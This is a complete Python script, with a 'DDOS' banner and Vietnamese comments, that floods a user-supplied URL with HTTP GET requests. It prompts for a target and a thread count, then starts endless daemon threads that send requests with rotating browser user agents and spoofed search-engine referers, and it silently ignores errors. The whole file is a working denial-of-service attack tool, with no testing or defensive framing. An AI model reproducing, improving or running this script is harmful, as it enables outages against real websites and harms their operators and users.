import requests
import threading
import random
import os
import time

os.system('cls' if os.name == 'nt' else 'clear')
banner = """
████████▄  ████████▄   ▄██████▄     ▄████████ 
███   ▀███ ███   ▀███ ███    ███   ███    ███ 
███    ███ ███    ███ ███    ███   ███    █▀  
███    ███ ███    ███ ███    ███   ███        
███    ███ ███    ███ ███    ███ ▀███████████ 
███    ███ ███    ███ ███    ███          ███ 
███   ▄███ ███   ▄███ ███    ███    ▄█    ███ 
████████▀  ████████▀   ▀██████▀   ▄████████▀  
"""
print(banner)

try:
    url = input("Host/URL: ")
    thread = int(input("Threads: "))
    print(f"Attack To {url} With {thread} Thread..")
except ValueError:
    exit()

ua = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:85.0) Gecko/20100101 Firefox/85.0",
    "Mozilla/5.0 (Linux; Android 11; SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/85.0.564.44",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
]

cc = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://search.yahoo.com/",
]

def ddos():
    # Thêm vòng lặp để thread chạy liên tục
    while True:
        try:
            headers = {
                "User-Agent": random.choice(ua),
                "Cache-Control": "no-cache",
                "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
                "Referer": random.choice(cc) + url,
                "Keep-Alive": str(random.randint(110, 120)),
                "Connection": "keep-alive",
                "Host": url.split('//')[-1]
            }
            # Lệnh bóp cò đây:
            requests.get(url, headers=headers, timeout=5)
        except:
            pass

for _ in range(thread):
    t = threading.Thread(target=ddos)
    t.daemon = True
    t.start()

try:
    while True:
        time.sleep(1) # Để sleep 1 là đủ, không cần 0.0001 tốn CPU máy mình
except KeyboardInterrupt:
    exit()